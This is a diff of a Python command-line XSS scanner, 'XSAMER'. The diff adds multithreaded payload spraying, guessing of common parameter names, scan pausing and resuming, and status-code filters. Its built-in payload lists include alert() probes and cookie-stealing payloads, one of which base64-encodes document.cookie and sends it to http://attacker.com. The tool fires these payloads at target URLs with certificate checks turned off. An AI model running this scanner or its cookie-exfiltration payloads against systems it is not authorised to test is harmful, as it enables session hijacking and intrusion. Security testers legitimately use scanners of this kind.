@@ -4,9 +4,12 @@ import json
 import time
 import argparse
 import sys
-from urllib.parse import urljoin, urlparse
 import os
 import glob
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import urlparse, parse_qs
+import signal
 
 def show_banner():
     """Display XSAMER banner"""
@@ -18,46 +21,72 @@ def show_banner():
 ██╔╝ ██╗███████║██║  ██║██║ ╚═╝ ██║███████╗██║  ██║
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                                     
-   --------------   Welcome to XSAMER  BY Samer EL HAGE ----------- """)
+    """)
 
 
 class XSSTester:
     def __init__(self):
         self.payloads_file = "xss_payloads.json"
-        self.results_file = "xsamer_result.txt"  # Changed to only vulnerable results
+        self.results_file = "xsamer_result.txt"
+        self.progress_file = "xsamer_progress.json"
         self.payloads_dir = "payloads"
         self.urls_file = "urls.txt"
         self.verbose = False
+        self.threads = 10
+        self.pause_event = threading.Event()
+        self.scanning = False
+        self.vulnerable_results = []
+        self.status_filter = None
         self.load_payloads()
         
     def load_payloads(self):
-        """Load XSS payloads from JSON file and payloads directory"""
-        # Create payloads directory if it doesn't exist
+        """Load ALL payloads from .txt files in payloads directory"""
         os.makedirs(self.payloads_dir, exist_ok=True)
+        self.payloads = {}
+        self.load_payloads_from_files()
         
-        # Load from JSON file
-        if os.path.exists(self.payloads_file):
-            with open(self.payloads_file, 'r') as f:
-                self.payloads = json.load(f)
-        else:
-            # Default payloads
-            self.payloads = {
-                "basic_xss": [
-                    "<script>alert('XSS')</script>",
-                    "<img src=x onerror=alert(1)>",
-                    "\"><svg onload=alert(1)>",
-                    "javascript:alert('XSS')",
-                    "<body onload=alert('XSS')>"
-                ]
-            }
-            self.save_payloads()
+        if not self.payloads:
+            self.create_default_payloads()
+    
+    def create_default_payloads(self):
+        """Create default payload files if none exist"""
+        default_payloads = {
+            "basic_xss.txt": [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert(1)>",
+                "\"><svg onload=alert(1)>",
+                "javascript:alert('XSS')",
+                "<body onload=alert('XSS')>"
+            ],
+            "advanced_xss.txt": [
+                "<script>fetch('/steal?cookie='+document.cookie)</script>",
+                "<img src=x onerror=\"fetch('http://attacker.com/?c='+btoa(document.cookie))\">",
+                "<iframe src=\"javascript:alert('XSS')\">",
+                "<object data=\"javascript:alert('XSS')\">"
+            ],
+            "dom_xss.txt": [
+                "#<img src=x onerror=alert(1)>",
+                "javascript:alert('DOM-XSS')",
+                "#\" onmouseover=\"alert(1)"
+            ]
+        }
         
-        # Load payloads from text files
+        for filename, payloads in default_payloads.items():
+            filepath = os.path.join(self.payloads_dir, filename)
+            with open(filepath, 'w') as f:
+                f.write("# " + filename + "\n")
+                for payload in payloads:
+                    f.write(payload + "\n")
+            print(f"[+] Created {filename} with {len(payloads)} payloads")
+        
         self.load_payloads_from_files()
     
     def load_payloads_from_files(self):
-        """Load additional payloads from .txt files in payloads directory"""
+        """Load ALL payloads from ALL .txt files in payloads directory"""
         txt_files = glob.glob(os.path.join(self.payloads_dir, "*.txt"))
+        
+        if not txt_files:
+            return
         
         for file_path in txt_files:
             category_name = os.path.splitext(os.path.basename(file_path))[0]
@@ -67,37 +96,72 @@ class XSSTester:
                     payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                 
                 if payloads:
-                    if category_name in self.payloads:
-                        # Merge with existing category
-                        existing_payloads = set(self.payloads[category_name])
-                        new_payloads = [p for p in payloads if p not in existing_payloads]
-                        self.payloads[category_name].extend(new_payloads)
-                        if self.verbose:
-                            print(f"[+] Loaded {len(new_payloads)} payloads from {file_path} into '{category_name}'")
-                    else:
-                        # Create new category
-                        self.payloads[category_name] = payloads
-                        if self.verbose:
-                            print(f"[+] Created category '{category_name}' with {len(payloads)} payloads from {file_path}")
+                    self.payloads[category_name] = payloads
             
             except Exception as e:
                 print(f"[-] Error loading {file_path}: {e}")
     
-    def get_all_xss_payloads(self):
-        """Get all payloads from basic_xss, advanced_xss, and dom_xss categories"""
+    def get_all_payloads(self):
+        """Get ALL payloads from ALL .txt files"""
         all_payloads = []
-        target_categories = ['basic_xss', 'advanced_xss', 'dom_xss']
-        
-        for category in target_categories:
-            if category in self.payloads:
-                all_payloads.extend(self.payloads[category])
-                if self.verbose:
-                    print(f"[+] Added {len(self.payloads[category])} payloads from {category}")
-            else:
-                if self.verbose:
-                    print(f"[-] Category '{category}' not found")
-        
+        for category, payloads in self.payloads.items():
+            all_payloads.extend(payloads)
         return all_payloads
+    
+    def discover_parameters(self, url, methods=['GET']):
+        """Discover parameters from URL and common parameter lists"""
+        print(f"\n🎯 Discovering parameters...", end="", flush=True)
+        
+        discovered_params = set()
+        
+        # Extract parameters from URL query string
+        parsed = urlparse(url)
+        if parsed.query:
+            query_params = parse_qs(parsed.query)
+            discovered_params.update(query_params.keys())
+        
+        # Common parameters to test
+        common_params = [
+            'q', 'search', 'query', 'id', 'page', 'name', 'email', 'user', 'username',
+            'password', 'redirect', 'url', 'return', 'next', 'file', 'path', 'dir',
+            'category', 'type', 'view', 'template', 'cmd', 'command', 'exec',
+            'code', 'filter', 'sort', 'order', 'limit', 'offset', 'callback',
+            'jsonp', 'func', 'function', 'action', 'do', 'process', 'submit'
+        ]
+        
+        discovered_params.update(common_params)
+        
+        # Test each parameter with a simple request
+        test_params = list(discovered_params)[:20]
+        
+        valid_params = set()
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+        }
+        
+        def test_param(param):
+            try:
+                test_url = f"{url}?{param}=test"
+                response = requests.get(test_url, headers=headers, timeout=5, verify=False)
+                
+                if response.status_code < 500:
+                    return param
+            except:
+                pass
+            return None
+        
+        # Test parameters with threading
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [executor.submit(test_param, param) for param in test_params]
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    valid_params.add(result)
+        
+        print(f" found {len(valid_params)} parameters")
+        
+        return list(valid_params)
     
     def load_urls_from_file(self, file_path):
         """Load URLs from a text file"""
@@ -109,7 +173,6 @@ class XSSTester:
             with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                 urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
             
-            # Validate URLs
             valid_urls = []
             for url in urls:
                 if url.startswith(('http://', 'https://')):
@@ -124,16 +187,27 @@ class XSSTester:
             print(f"[-] Error loading URLs from {file_path}: {e}")
             return []
     
-    def save_payloads(self):
-        """Save payloads to JSON file"""
-        with open(self.payloads_file, 'w') as f:
-            json.dump(self.payloads, f, indent=4)
+    def save_progress(self, current_state):
+        """Save scan progress to file"""
+        try:
+            with open(self.progress_file, 'w') as f:
+                json.dump(current_state, f, indent=2)
+        except:
+            pass
     
-    def save_vulnerable_results(self, results):
-        """Save only vulnerable results to file"""
-        vulnerable = [r for r in results if r.get('reflected') and not r.get('error')]
-        
-        if not vulnerable:
+    def load_progress(self):
+        """Load scan progress from file"""
+        if os.path.exists(self.progress_file):
+            try:
+                with open(self.progress_file, 'r') as f:
+                    return json.load(f)
+            except:
+                pass
+        return None
+    
+    def save_vulnerable_results(self):
+        """Save ONLY vulnerable results to file"""
+        if not self.vulnerable_results:
             print("[-] No vulnerable results to save")
             return
         
@@ -143,10 +217,10 @@ class XSSTester:
                 f.write("XSAMER - XSS VULNERABILITY SCAN RESULTS\n")
                 f.write("=" * 80 + "\n")
                 f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-                f.write(f"Total Vulnerabilities Found: {len(vulnerable)}\n")
+                f.write(f"Total Vulnerabilities Found: {len(self.vulnerable_results)}\n")
                 f.write("=" * 80 + "\n\n")
                 
-                for i, vuln in enumerate(vulnerable, 1):
+                for i, vuln in enumerate(self.vulnerable_results, 1):
                     f.write(f"VULNERABILITY #{i}\n")
                     f.write(f"URL: {vuln['test_url']}\n")
                     f.write(f"Payload: {vuln['payload']}\n")
@@ -157,83 +231,47 @@ class XSSTester:
                     f.write("-" * 80 + "\n\n")
             
             print(f"[+] Vulnerable results saved to: {self.results_file}")
-            print(f"[+] Total vulnerabilities recorded: {len(vulnerable)}")
+            print(f"[+] Total vulnerabilities recorded: {len(self.vulnerable_results)}")
             
         except Exception as e:
             print(f"[-] Error saving results: {e}")
     
-    def import_payloads_from_file(self, file_path, category_name=None):
-        """Import payloads from a text file"""
-        if not os.path.exists(file_path):
-            print(f"[-] File not found: {file_path}")
-            return False
-        
-        if category_name is None:
-            category_name = os.path.splitext(os.path.basename(file_path))[0]
-        
-        try:
-            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-            
-            if not payloads:
-                print(f"[-] No payloads found in {file_path}")
-                return False
-            
-            if category_name in self.payloads:
-                # Add to existing category
-                existing_payloads = set(self.payloads[category_name])
-                new_payloads = [p for p in payloads if p not in existing_payloads]
-                self.payloads[category_name].extend(new_payloads)
-                print(f"[+] Added {len(new_payloads)} payloads to existing category '{category_name}'")
-            else:
-                # Create new category
-                self.payloads[category_name] = payloads
-                print(f"[+] Created new category '{category_name}' with {len(payloads)} payloads")
-            
-            self.save_payloads()
-            return True
-            
-        except Exception as e:
-            print(f"[-] Error importing from {file_path}: {e}")
-            return False
-    
-    def show_payloads(self):
-        """Display all available payloads"""
-        print("\n" + "="*50)
-        print("AVAILABLE XSS PAYLOADS")
-        print("="*50)
-        
-        total_payloads = 0
-        for category, payload_list in self.payloads.items():
-            print(f"\n[{category.upper()}] - {len(payload_list)} payloads")
-            for i, payload in enumerate(payload_list[:10], 1):  # Show first 10 only
-                print(f"  {i}. {payload}")
-            if len(payload_list) > 10:
-                print(f"  ... and {len(payload_list) - 10} more")
-            total_payloads += len(payload_list)
-        
-        print(f"\n📊 Total categories: {len(self.payloads)}")
-        print(f"📊 Total payloads: {total_payloads}")
-        
-        # Show XSS combo info
-        xss_payloads = self.get_all_xss_payloads()
-        print(f"\n🎯 XSS Combo (basic_xss + advanced_xss + dom_xss): {len(xss_payloads)} payloads")
-    
     def get_status_color(self, status_code):
         """Get color for status code"""
         if 200 <= status_code < 300:
-            return "🟢"  # Green for success
+            return "🟢"
         elif 300 <= status_code < 400:
-            return "🟡"  # Yellow for redirect
+            return "🟡"
         elif 400 <= status_code < 500:
-            return "🔴"  # Red for client error
+            return "🔴"
         elif 500 <= status_code < 600:
-            return "🟣"  # Purple for server error
+            return "🟣"
         else:
-            return "⚪"  # White for other
+            return "⚪"
     
-    def test_url(self, url, payload, method="GET", param="q"):
-        """Test a single URL with a payload"""
+    def should_show_result(self, status_code):
+        """Check if result should be shown based on status filter"""
+        if self.status_filter is None:
+            # Default: show only reflected payloads
+            return False
+        
+        # Convert status filter to range
+        if self.status_filter == 200:
+            return 200 <= status_code < 300
+        elif self.status_filter == 300:
+            return 300 <= status_code < 400
+        elif self.status_filter == 400:
+            return 400 <= status_code < 500
+        elif self.status_filter == 500:
+            return 500 <= status_code < 600
+        else:
+            return status_code == self.status_filter
+    
+    def test_single_payload(self, url, payload, method, param):
+        """Test a single payload (thread-safe)"""
+        if self.pause_event.is_set():
+            return None
+            
         headers = {
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
@@ -241,19 +279,12 @@ class XSSTester:
         
         try:
             if method.upper() == "GET":
-                # Test in URL parameters
                 test_url = f"{url}?{param}={requests.utils.quote(payload)}"
-                if self.verbose:
-                    print(f"   🔍 Testing: {param}={payload}")
                 response = requests.get(test_url, headers=headers, timeout=10, verify=False)
             else:
-                # Test in POST data
                 data = {param: payload}
-                if self.verbose:
-                    print(f"   🔍 Testing: POST {param}={payload}")
                 response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
             
-            # Check for reflection
             reflection_points = self.check_reflection(response.text, payload)
             
             result = {
@@ -269,19 +300,9 @@ class XSSTester:
                 'error': False
             }
             
-            status_color = self.get_status_color(response.status_code)
-            
-            if self.verbose:
-                if result['reflected']:
-                    print(f"   🚨 REFLECTED! {status_color} {response.status_code} | Points: {reflection_points}")
-                else:
-                    print(f"   {status_color} {response.status_code} | No reflection")
-            
             return result
             
         except Exception as e:
-            if self.verbose:
-                print(f"   ❌ Error: {e}")
             return {
                 'url': url,
                 'payload': payload,
@@ -293,7 +314,6 @@ class XSSTester:
         """Check where the payload is reflected in the response"""
         reflection_points = []
         
-        # Check different contexts
         if payload in content:
             reflection_points.append("raw")
         
@@ -307,166 +327,213 @@ class XSSTester:
         if f"> {payload}" in content or f"{payload} <" in content:
             reflection_points.append("in_text")
         
-        # Check for partial reflection
         for char in ['<', '>', '"', "'"]:
             if char in payload and char in content:
                 reflection_points.append(f"contains_{char}")
         
         return reflection_points
     
-    def scan_website(self, target_url, categories=None, methods=None, parameters=None, use_xss_combo=False):
-        """Perform comprehensive XSS scanning for a single URL"""
-        if use_xss_combo:
-            # Use the special XSS combo
-            payloads_to_use = self.get_all_xss_payloads()
-            categories_used = "XSS Combo (basic+advanced+dom)"
-        elif categories is None:
-            # Use all categories by default
-            categories = list(self.payloads.keys())
-            payloads_to_use = []
-            for cat in categories:
-                payloads_to_use.extend(self.payloads[cat])
-            categories_used = "All categories"
-        else:
-            # Use specified categories
-            payloads_to_use = []
-            for cat in categories:
-                if cat in self.payloads:
-                    payloads_to_use.extend(self.payloads[cat])
-            categories_used = ', '.join(categories)
+    def scan_website(self, target_url, methods=None, parameters=None, resume=False):
+        """Perform comprehensive XSS scanning with ALL payloads"""
+        # Always use ALL payloads from ALL .txt files
+        payloads_to_use = self.get_all_payloads()
         
         if methods is None:
             methods = ['GET']
+        
+        # Auto-discover parameters if not provided
         if parameters is None:
-            parameters = ['q', 'search', 'query', 'id', 'page', 'name', 'email']
+            parameters = self.discover_parameters(target_url, methods)
         
-        print(f"\n🎯 Scanning: {target_url}")
-        print(f"📂 Categories: {categories_used}")
+        # Display scan information
+        print(f"\n🎯 Target: {target_url}")
+        print(f"📂 Payload Files: {len(self.payloads)}")
+        print(f"📦 Total Payloads: {len(payloads_to_use)}")
         print(f"🔧 Methods: {', '.join(methods)}")
-        print(f"📝 Parameters: {', '.join(parameters)}")
-        print(f"📊 Total payloads: {len(payloads_to_use)}")
+        print(f"📝 Parameters: {len(parameters)}")
+        print(f"🚀 Threads: {self.threads}")
         
-        if self.verbose:
-            print(f"\n📋 Payloads to test:")
-            for i, payload in enumerate(payloads_to_use[:5], 1):
-                print(f"   {i}. {payload}")
-            if len(payloads_to_use) > 5:
-                print(f"   ... and {len(payloads_to_use) - 5} more")
-        
-        results = []
-        total_tests = len(payloads_to_use) * len(methods) * len(parameters)
-        current_test = 0
-        
-        vulnerabilities_found = 0
-        
-        # Status code statistics
-        status_stats = {}
-        
+        # Prepare all test combinations
+        all_tests = []
         for payload in payloads_to_use:
             for method in methods:
                 for param in parameters:
-                    current_test += 1
-                    if not self.verbose:
-                        status_info = ""
-                        print(f"\r[*] Progress: {current_test}/{total_tests} | Testing: {payload[:30]}... {status_info}", end="", flush=True)
+                    all_tests.append((payload, method, param))
+        
+        total_tests = len(all_tests)
+        print(f"📈 Total Tests: {total_tests}")
+        print(f"⏰ Start Time: {time.strftime('%H:%M:%S')}")
+        
+        # Show filter information
+        if self.status_filter is None:
+            print("🔍 Filter: REFLECTED PAYLOADS ONLY")
+        else:
+            print(f"🔍 Filter: STATUS CODE {self.status_filter} ONLY")
+        
+        print("\n" + "="*50)
+        print("💡 Press Ctrl+C to pause")
+        print("="*50 + "\n")
+        
+        # Resume functionality
+        start_index = 0
+        if resume:
+            progress = self.load_progress()
+            if progress and progress.get('url') == target_url:
+                start_index = progress.get('current_test', 0)
+                print(f"[+] Resuming from test {start_index + 1}/{total_tests}")
+        
+        vulnerabilities_found = 0
+        completed_tests = 0
+        
+        self.scanning = True
+        self.pause_event.clear()
+        
+        def worker(test_info):
+            if self.pause_event.is_set():
+                return None
+            payload, method, param = test_info
+            return self.test_single_payload(target_url, payload, method, param)
+        
+        # Progress monitoring thread
+        def monitor_progress():
+            while self.scanning and completed_tests < total_tests:
+                if not self.pause_event.is_set():
+                    current_state = {
+                        'url': target_url,
+                        'current_test': completed_tests,
+                        'total_tests': total_tests,
+                        'vulnerabilities': vulnerabilities_found,
+                        'timestamp': time.time()
+                    }
+                    self.save_progress(current_state)
+                time.sleep(10)
+        
+        # Start progress monitor
+        progress_thread = threading.Thread(target=monitor_progress)
+        progress_thread.daemon = True
+        progress_thread.start()
+        
+        try:
+            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+                # Submit all tests
+                future_to_test = {executor.submit(worker, test): test for test in all_tests[start_index:]}
+                
+                for future in as_completed(future_to_test):
+                    if self.pause_event.is_set():
+                        break
+                        
+                    test = future_to_test[future]
+                    payload, method, param = test
+                    completed_tests += 1
                     
-                    result = self.test_url(target_url, payload, method, param)
+                    try:
+                        result = future.result()
+                        if result and not result.get('error'):
+                            status_code = result['status_code']
+                            
+                            # Check if we should show this result based on filter
+                            should_show = False
+                            show_reason = ""
+                            
+                            if self.status_filter is None:
+                                # Default: show only reflected payloads
+                                should_show = result.get('reflected')
+                                show_reason = "REFLECTED"
+                            else:
+                                # Show based on status code filter
+                                should_show = self.should_show_result(status_code)
+                                show_reason = f"STATUS {self.status_filter}"
+                            
+                            if should_show:
+                                status_color = self.get_status_color(status_code)
+                                payloads_left = total_tests - completed_tests
+                                
+                                print(f"📡 {show_reason} PAYLOAD")
+                                print(f"   📍 Status: {status_color} {status_code}")
+                                print(f"   🔧 Parameter: {param}")
+                                print(f"   📦 Payload: {result['payload']}")
+                                
+                                if result.get('reflected'):
+                                    print(f"   🔄 Reflection: {', '.join(result['reflection_points'])}")
+                                    vulnerabilities_found += 1
+                                    self.vulnerable_results.append(result)
+                                
+                                print(f"   🌐 URL: {result['test_url']}")
+                                print(f"   📊 Payloads left: {payloads_left}")
+                                print("   " + "-" * 50)
                     
-                    # Update status statistics
-                    if not result.get('error'):
-                        status_code = result['status_code']
-                        if status_code in status_stats:
-                            status_stats[status_code] += 1
+                    except Exception as e:
+                        # Only show errors in verbose mode
+                        if self.verbose:
+                            print(f"[-] Error in test: {e}")
+                    
+                    # Show progress every 25 tests
+                    if completed_tests % 25 == 0:
+                        payloads_left = total_tests - completed_tests
+                        progress_percent = (completed_tests / total_tests) * 100
+                        filter_info = ""
+                        if self.status_filter is None:
+                            filter_info = f" | Reflected: {vulnerabilities_found}"
                         else:
-                            status_stats[status_code] = 1
-                    
-                    if result.get('reflected'):
-                        vulnerabilities_found += 1
-                        if not self.verbose:
-                            status_color = self.get_status_color(result['status_code'])
-                            print(f"\n🚨 VULNERABILITY FOUND!")
-                            print(f"   🔴 URL: {result['test_url']}")
-                            print(f"   📦 Payload: {result['payload']}")
-                            print(f"   📍 Reflection: {result['reflection_points']}")
-                            print(f"   📊 Status: {status_color} {result['status_code']}")
-                    
-                    results.append(result)
-                    
-                    # Rate limiting
-                    time.sleep(0.1)
-        
-        if not self.verbose:
-            print()  # New line after progress
-        
-        # Show status code summary
-        if status_stats:
-            print(f"\n📊 STATUS CODE SUMMARY:")
-            for status_code, count in sorted(status_stats.items()):
-                status_color = self.get_status_color(status_code)
-                print(f"   {status_color} {status_code}: {count} responses")
-        
-        return results, vulnerabilities_found
-    
-    def scan_multiple_urls(self, urls, categories=None, methods=None, parameters=None, use_xss_combo=False):
-        """Scan multiple URLs from a list"""
-        all_results = []
-        total_vulnerabilities = 0
-        
-        if use_xss_combo:
-            combo_payloads = self.get_all_xss_payloads()
-            print(f"\n🔍 Starting scan of {len(urls)} URLs with XSS Combo")
-            print(f"📂 Using XSS Combo: {len(combo_payloads)} payloads (basic+advanced+dom)")
-        else:
-            if categories is None:
-                categories = list(self.payloads.keys())
-            total_payloads = sum(len(self.payloads.get(cat, [])) for cat in categories)
-            print(f"\n🔍 Starting scan of {len(urls)} URLs")
-            print(f"📂 Using {len(categories)} payload categories")
-            print(f"📊 Total payloads: {total_payloads}")
-        
-        print("="*60)
-        
-        for i, url in enumerate(urls, 1):
-            print(f"\n[{i}/{len(urls)}] Scanning: {url}")
+                            filter_info = f" | Status {self.status_filter}"
+                        
+                        print(f"\r[*] Progress: {completed_tests}/{total_tests} ({progress_percent:.1f}%) | Payloads left: {payloads_left}{filter_info}", end="", flush=True)
             
-            results, vuln_count = self.scan_website(
-                url, 
-                categories=categories,
-                methods=methods,
-                parameters=parameters,
-                use_xss_combo=use_xss_combo
-            )
-            all_results.extend(results)
-            total_vulnerabilities += vuln_count
-            
-            # Brief pause between URLs
-            time.sleep(0.5)
+        except KeyboardInterrupt:
+            payloads_left = total_tests - completed_tests
+            print(f"\n\n⏸️  Scan paused!")
+            print(f"📊 Completed: {completed_tests}/{total_tests}")
+            print(f"📦 Payloads left: {payloads_left}")
+            if self.status_filter is None:
+                print(f"🚨 Reflected payloads: {vulnerabilities_found}")
+            else:
+                print(f"📡 Status {self.status_filter} payloads shown")
+            print("💡 Use 'xsamer --resume' to continue")
+            self.pause_event.set()
+            return vulnerabilities_found, True
         
-        return all_results, total_vulnerabilities
-    
-    def generate_report(self, results, total_vulnerabilities=0):
-        """Generate a summary report"""
-        vulnerable = [r for r in results if r.get('reflected') and not r.get('error')]
+        self.scanning = False
         
-        print("\n" + "="*60)
-        print("📊 XSS SCAN REPORT")
-        print("="*60)
-        print(f"Total tests performed: {len(results)}")
-        print(f"Potential vulnerabilities found: {len(vulnerable)}")
-        
-        if vulnerable:
-            print("\n🚨 POTENTIAL XSS VULNERABILITIES FOUND:")
-            for i, vuln in enumerate(vulnerable, 1):
-                status_color = self.get_status_color(vuln['status_code'])
-                print(f"\n{i}. 🔴 URL: {vuln['test_url']}")
-                print(f"   📦 Payload: {vuln['payload']}")
-                print(f"   ⚡ Method: {vuln['method']}")
-                print(f"   🔧 Parameter: {vuln['parameter']}")
-                print(f"   📍 Reflection: {', '.join(vuln['reflection_points'])}")
-                print(f"   📊 Status: {status_color} {vuln['status_code']}")
+        print(f"\n\n✅ Scan Completed!")
+        print(f"📊 Total Tests: {total_tests}")
+        if self.status_filter is None:
+            print(f"🚨 Reflected Payloads Found: {vulnerabilities_found}")
         else:
-            print("\n✅ No obvious XSS vulnerabilities detected.")
-            print("💡 Note: This tool checks for reflection. Manual verification is recommended.")
+            print(f"📡 Status {self.status_filter} Payloads Shown")
+        print(f"⏰ End Time: {time.strftime('%H:%M:%S')}")
+        
+        return vulnerabilities_found, False
+    
+    def resume_scan(self):
+        """Resume a paused scan"""
+        progress = self.load_progress()
+        if not progress:
+            print("[-] No progress file found to resume")
+            return None, 0
+        
+        print(f"[+] Resuming scan for: {progress['url']}")
+        print(f"[+] Previous progress: {progress['current_test']}/{progress['total_tests']} tests")
+        print(f"[+] Payloads left: {progress['total_tests'] - progress['current_test']}")
+        print(f"[+] Reflected payloads found: {progress.get('vulnerabilities', 0)}")
+        
+        return progress['url'], progress.get('vulnerabilities', 0)
+    
+    def show_payload_summary(self):
+        """Show summary of available payloads"""
+        print("\n📁 PAYLOAD FILES SUMMARY:")
+        print("=" * 40)
+        total_payloads = 0
+        for category, payloads in self.payloads.items():
+            print(f"  {category}: {len(payloads)} payloads")
+            total_payloads += len(payloads)
+        print(f"\n📊 Total: {total_payloads} payloads from {len(self.payloads)} files")
+        print("\n💡 All payloads will be tested during scanning")
+
+
+def signal_handler(sig, frame):
+    """Handle Ctrl+C for graceful pause"""
+    print("\n\n⏸️  Pause signal received...")
+
 
 def main():
     # Show banner when no arguments provided
@@ -476,13 +543,20 @@ def main():
         print("=" * 50)
         print("Usage: xsamer [OPTIONS]")
         print("\nQuick Start:")
-        print("  xsamer -u https://example.com        # Scan single URL")
-        print("  xsamer -l urls.txt                   # Scan URLs from file")
-        print("  xsamer -u https://example.com -xss   # Use XSS Combo")
-        print("  xsamer -u https://example.com -v     # Verbose mode (shows status codes)")
-        print("  xsamer --show                        # Show all payloads")
-        print("\nUse 'xsamer -h' for full help")
+        print("  xsamer -u https://example.com        # Default: reflected only")
+        print("  xsamer -u https://example.com --r200 # Show only 200 status")
+        print("  xsamer -u https://example.com --r300 # Show only 300 status") 
+        print("  xsamer -u https://example.com --r400 # Show only 400 status")
+        print("  xsamer -u https://example.com --r500 # Show only 500 status")
+        print("  xsamer -u https://example.com -t 20  # Fast scan with 20 threads")
+        print("  xsamer --resume                      # Resume paused scan")
+        print("  xsamer --show                        # Show payload files")
+        print("\n💡 Default: Shows only REFLECTED payloads")
+        print("💡 Use --r200, --r300, --r400, --r500 to filter by status code")
         return
+
+    # Set up signal handler for pause
+    signal.signal(signal.SIGINT, signal_handler)
 
     parser = argparse.ArgumentParser(description='🚀 XSAMER - Advanced XSS Scanner Tool', 
                                    usage='xsamer [OPTIONS]')
@@ -490,51 +564,67 @@ def main():
     # Main scanning options
     parser.add_argument('-u', '--url', help='Single URL to scan')
     parser.add_argument('-l', '--list', dest='urls_file', help='File containing list of URLs to scan')
-    parser.add_argument('-xss', action='store_true', help='Use XSS Combo (basic_xss + advanced_xss + dom_xss)')
+    parser.add_argument('--resume', action='store_true', help='Resume paused scan')
+    
+    # Status code filters (fixed with proper argument names)
+    parser.add_argument('--r200', action='store_true', help='Show only 200 status codes')
+    parser.add_argument('--r300', action='store_true', help='Show only 300 status codes')
+    parser.add_argument('--r400', action='store_true', help='Show only 400 status codes')
+    parser.add_argument('--r500', action='store_true', help='Show only 500 status codes')
+    
+    # Performance options
+    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
     
     # Payload and scanning options
-    parser.add_argument('-c', '--categories', nargs='+', help='Specific payload categories to use')
-    parser.add_argument('-p', '--params', nargs='+', default=['q', 'search', 'query', 'id', 'page'], 
-                       help='Parameters to test (default: q,search,query,id,page)')
-    parser.add_argument('-m', '--methods', nargs='+', default=['GET'], 
-                       help='HTTP methods to test (default: GET)')
+    parser.add_argument('-p', '--params', nargs='+', help='Specific parameters to test (auto-discover if not provided)')
+    parser.add_argument('-m', '--methods', nargs='+', default=['GET'], help='HTTP methods to test (default: GET)')
     
-    # Information and debug options
-    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output (shows status codes)')
-    parser.add_argument('--show', action='store_true', help='Show all available payloads')
-    parser.add_argument('--import-payloads', help='Import payloads from text file')
+    # Information options
+    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output (shows errors)')
+    parser.add_argument('--show', action='store_true', help='Show all available payload files')
     
     args = parser.parse_args()
     scanner = XSSTester()
     scanner.verbose = args.verbose
+    scanner.threads = args.threads
     
-    # Show payloads
+    # Set status code filter (fixed argument access)
+    if args.r200:
+        scanner.status_filter = 200
+    elif args.r300:
+        scanner.status_filter = 300
+    elif args.r400:
+        scanner.status_filter = 400
+    elif args.r500:
+        scanner.status_filter = 500
+    else:
+        scanner.status_filter = None  # Default: reflected only
+    
+    # Show payload files
     if args.show:
-        scanner.show_payloads()
+        scanner.show_payload_summary()
         return
     
-    # Import payloads
-    if args.import_payloads:
-        scanner.import_payloads_from_file(args.import_payloads)
-        return
+    # Resume scan
+    if args.resume:
+        target_url, previous_vulns = scanner.resume_scan()
+        if target_url:
+            args.url = target_url
     
     # Determine URLs to scan
     urls_to_scan = []
     
     if args.urls_file:
-        # Load URLs from file
         urls_to_scan = scanner.load_urls_from_file(args.urls_file)
         if not urls_to_scan:
             print("[-] No valid URLs found to scan")
             return
     elif args.url:
-        # Single URL provided
         url = args.url
         if not url.startswith(('http://', 'https://')):
             url = 'https://' + url
         urls_to_scan = [url]
     else:
-        # Check if urls.txt exists by default
         if os.path.exists('urls.txt'):
             urls_to_scan = scanner.load_urls_from_file('urls.txt')
             if not urls_to_scan:
@@ -545,59 +635,48 @@ def main():
             parser.print_help()
             return
     
-    # Determine payload categories
-    if args.xss:
-        # Use XSS Combo (basic + advanced + dom)
-        use_xss_combo = True
-        categories_to_use = None
-        print("[+] Using XSS Combo: basic_xss + advanced_xss + dom_xss")
-    elif args.categories:
-        # Use specified categories
-        use_xss_combo = False
-        categories_to_use = args.categories
-        print(f"[+] Using specified categories: {', '.join(categories_to_use)}")
-    else:
-        # Use all available categories by default
-        use_xss_combo = False
-        categories_to_use = list(scanner.payloads.keys())
-        print(f"[+] Using all {len(categories_to_use)} payload categories")
-    
     # Show scanning info
-    if use_xss_combo:
-        total_payloads = len(scanner.get_all_xss_payloads())
-    else:
-        total_payloads = sum(len(scanner.payloads.get(cat, [])) for cat in categories_to_use)
+    total_payloads = len(scanner.get_all_payloads())
+    print(f"\n🚀 XSAMER SCANNER STARTED")
+    print("=" * 50)
+    print(f"[+] Target URLs: {len(urls_to_scan)}")
+    print(f"[+] Payload Files: {len(scanner.payloads)}")
+    print(f"[+] Total Payloads: {total_payloads}")
+    print(f"[+] Threads: {scanner.threads}")
     
-    print(f"[+] Total payloads to test: {total_payloads}")
-    print(f"[+] Total URLs to scan: {len(urls_to_scan)}")
-    if args.verbose:
-        print("[+] Verbose mode: ON - Showing status codes for each payload")
+    if scanner.status_filter is None:
+        print(f"[+] Output: REFLECTED PAYLOADS ONLY")
+    else:
+        print(f"[+] Output: STATUS CODE {scanner.status_filter} ONLY")
     
     # Perform scanning
-    if len(urls_to_scan) == 1:
-        # Single URL scan
-        results, vuln_count = scanner.scan_website(
-            urls_to_scan[0], 
-            categories=categories_to_use,
-            methods=args.methods,
-            parameters=args.params,
-            use_xss_combo=use_xss_combo
-        )
-    else:
-        # Multiple URLs scan
-        results, vuln_count = scanner.scan_multiple_urls(
-            urls_to_scan,
